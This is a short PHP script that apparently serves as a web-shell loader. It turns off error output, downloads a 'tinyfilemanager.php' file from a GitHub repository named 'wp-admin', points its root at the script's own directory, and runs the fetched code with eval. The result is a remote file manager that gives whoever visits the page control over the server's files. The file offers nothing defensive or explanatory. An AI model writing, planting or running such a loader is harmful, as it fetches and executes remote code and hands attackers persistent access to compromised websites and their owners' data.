<?php
error_reporting(0);
ini_set('display_errors', 0);

$url = 'https://raw.githubusercontent.com/seozax/wp-admin/refs/heads/main/tinyfilemanager.php';
$content = file_get_contents($url);

if($content) {
    $content = str_replace(
        '$root_path = $_SERVER[\'DOCUMENT_ROOT\'];',
        '$root_path = __DIR__;',
        $content
    );
    
    eval('?>' . $content);
} else {
    echo "Gagal download file. Cek koneksi/URL.";
}
?>
